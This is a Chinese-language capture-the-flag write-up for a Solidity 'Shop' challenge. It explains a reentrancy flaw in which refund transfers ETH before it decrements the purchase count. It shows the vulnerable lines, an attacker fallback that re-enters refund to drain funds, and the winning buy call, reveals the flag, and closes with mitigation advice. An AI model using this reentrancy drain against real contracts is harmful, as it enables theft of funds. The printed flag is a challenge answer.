# Shop

## 题目简述

合约的 `refund` 先向调用者转账，之后才减少 `bought[item]`。攻击合约在收款回调中再次调用 `refund`，可以在状态尚未更新时重复退款，积累足够的 ETH 购买 1337 ETH 的 flag 商品。

## 解题过程

漏洞顺序为：

```solidity
msg.sender.call.value(cost[item] * quantity)("");
bought[item] -= quantity;
```

部署攻击合约并让它先购买 1 个价格 5 ETH 的商品。调用退款时，Shop 向攻击合约转入 5 ETH，触发 `fallback`；回调再次执行 `refund(0, 1)`，而外层调用尚未执行减法，`bought[0]` 仍为 1。

```solidity
fallback() external payable {
    if (address(shop).balance >= 1000 ether) {
        shop.refund(0, 1);
    }
}
```

受 gas 与远端超时限制，可以把资金抽取拆成多笔交易，例如约 600、600、200 ETH。攻击合约余额达到 1337 ETH 后调用：

```solidity
shop.buy{value: 1337 ether}(3, 1);
```

`bought[3] > 0` 后挑战判定成功，得到：

```text
n00bz{5h0uld_h4v3_sub7r4ct3d_f1r5t}
```

## 方法总结

这是典型重入：外部调用发生在状态更新之前。应遵循 Checks-Effects-Interactions，先扣减购买数量再转账，并配合重入锁；另外 `bought` 未按用户地址区分也会造成错误的全局状态共享。
